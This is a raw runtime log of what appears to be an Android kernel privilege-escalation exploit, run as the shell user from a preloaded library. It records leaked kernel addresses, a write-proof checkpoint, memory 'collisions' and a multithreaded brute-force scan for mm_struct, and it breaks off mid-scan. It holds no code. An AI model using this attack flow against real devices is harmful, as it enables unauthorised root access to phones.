===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788945140.txt pid=9852 uid=2000
1788945140.870 9852 [+] preload starting pid=9852
1788945140.870 9852 [+] startup context pid=9852 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788945140.871 9852 [+] build config pid=9852 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788945140.871 9852 [+] p0 profile pid=9852 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788945140.872 9852 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788945140.873 9852 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=f2c10c54-0ff1-4225-9352-23a14501e182 (odd attempts: leaked page scratch, even attempts: this alias)
1788945144.370 9852 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788945146.551 9852 [*] pile-up verified: approx_time=1301
1788945146.552 9852 [*] start finding collisisons
1788945146.553 9852 [*] target    000000707b2ba0c8
1788945147.042 9852 [*]   0000005ddc1f5fa8
1788945148.674 9852 [*]   0000005ddcc793c8
1788945151.050 9852 [*]   0000005dde0f77b8
1788945155.696 9852 [*]   0000005de05d0e80
1788945156.078 9852 [*]   0000005de08743a0
1788945156.441 9852 [*]   0000005de0b188c0
1788945157.141 9852 [*]   0000005de10c9648
1788945157.589 9852 [*]   0000005de13cae50
1788945160.461 9852 [*]   0000005de2c80400
1788945162.199 9852 [*]   0000005de3c28140
1788945162.632 9852 [*]   0000005de3e5e2f0
1788945164.085 9852 [*]   0000005de4bf2f90
1788945166.484 9852 [*]   0000005de6103818
1788945167.035 9852 [*]   0000005de64341a0
1788945167.460 9852 [*]   0000005de6686430
1788945167.460 9852 [*] found 15 collisisons
1788945168.570 9852 [*] start bruteforcing
1788945168.575 9852 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788945168.576 9852 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788945168.575 9852 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788945168.577 9852 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788945168.577 9852 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788945168.577 9852 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788945168.577 9852 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788945168.579 9852 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
1788945168.580 9852 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788945168.580 9852 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788945168.585 9852 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
1788945168.586 9852 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
1788945168.589 9852 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
1788945168.580 9852 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788945168.590 9852 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
1788945168.591 9852 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
1788945168.583 9852 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
1788945168.583 9852 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
1788945168.587 9852 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
1788945168.596 9852 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
1788945168.591 9852 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
1788945168.593 9852 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
1788945168.595 9852 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
1788945168.597 9852 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
1788945168.601 9852 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
1788945168.597 9852 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
1788945168.598 9852 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
1788945168.598 9852 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
1788945168.600 9852 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
1788945168.603 9852 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
1788945168.604 9852 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
1788945168.605 9852 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
1788945168.609 9852 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
1788945168.622 9852 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
1788945168.623 9852 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
1788945168.609 9852 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
1788945168.610 9852 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
1788945168.613 9852 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
1788945168.616 9852 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
1788945168.619 9852 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
1788945168.619 9852 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
1788945168.625 9852 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
1788945168.627 9852 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
1788945168.628 9852 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
1788945168.631 9852 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
1788945168.634 9852 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
1788945168.637 9852 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
1788945168.640 9852 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
1788945168.643 9852 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
1788945168.645 9852 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
1788945168.648 9852 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
1788945168.652 9852 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
1788945168.655 9852 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
1788945168.656 9852 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
1788945168.657 9852 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
1788945168.658 9852 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
1788945168.661 9852 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
1788945168.662 9852 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
1788945168.662 9852 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
1788945168.665 9852 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
1788945168.668 9852 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
1788945168.668 9852 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
1788945168.668 9852 [*] [  1] tested 800000 candidates, scanning=0xffffff882ca48f00
1788945168.671 9852 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
1788945168.674 9852 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
1788945168.676 9852 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
